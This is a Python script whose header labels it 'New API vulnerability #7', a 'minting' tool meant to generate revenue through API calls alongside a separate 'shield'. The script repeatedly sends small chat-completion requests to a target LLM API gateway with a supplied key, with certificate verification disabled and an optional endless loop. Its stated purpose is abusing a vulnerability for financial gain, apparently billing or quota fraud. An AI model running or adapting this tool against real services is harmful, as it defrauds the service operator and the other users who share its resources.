#!/usr/bin/env python3
"""
New API 漏洞 #7 — 铸币脚本
============================
通过 API 调用产生收入。配合护盾使用。

用法:
  python3 mint.py --base https://目标 --key "sk-xxx" --model gpt-5.4-mini --rpm 2
"""

import argparse, json, time, http.client, ssl
from urllib.parse import urlparse

def mint_once(host, port, https, key, model, prompt, max_tokens, timeout):
    try:
        if https:
            ctx = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        body = json.dumps({"model": model, "messages": [{"role": "user", "content": prompt}], "max_tokens": max_tokens})
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {key}"}
        conn.request("POST", "/v1/chat/completions", body, headers)
        r = conn.getresponse(); data = r.read(); conn.close()
        if r.status == 200:
            d = json.loads(data)
            return True, d.get("usage", {}).get("total_tokens", 0)
        else:
            return False, r.status
    except Exception as e:
        return False, str(e)

def main():
    ap = argparse.ArgumentParser(description="New API 铸币脚本")
    ap.add_argument("--base", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--model", default="gpt-5.4-mini")
    ap.add_argument("--rpm", type=int, default=2)
    ap.add_argument("--prompt", default="hi")
    ap.add_argument("--max-tokens", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--count", type=int, default=0, help="总请求数（0=无限）")
    args = ap.parse_args()

    u = urlparse(args.base)
    host = u.hostname; https = (u.scheme == "https"); port = u.port or (443 if https else 80)
    interval = 60.0 / args.rpm if args.rpm > 0 else 30.0
    total = 0; ok = 0; fail = 0

    print(f"[mint] {args.base} model={args.model} RPM={args.rpm} interval={interval:.1f}s", flush=True)

    while True:
        success, info = mint_once(host, port, https, args.key, args.model, args.prompt, args.max_tokens, args.timeout)
        total += 1
        if success:
            ok += 1; print(f"[mint] #{total} OK tokens={info}", flush=True)
        else:
            fail += 1; print(f"[mint] #{total} FAIL {info}", flush=True)
        if args.count and total >= args.count:
            break
        time.sleep(interval)

    print(f"[mint] 完成: {ok}/{total} 成功, {fail} 失败", flush=True)

if __name__ == "__main__":
    main()
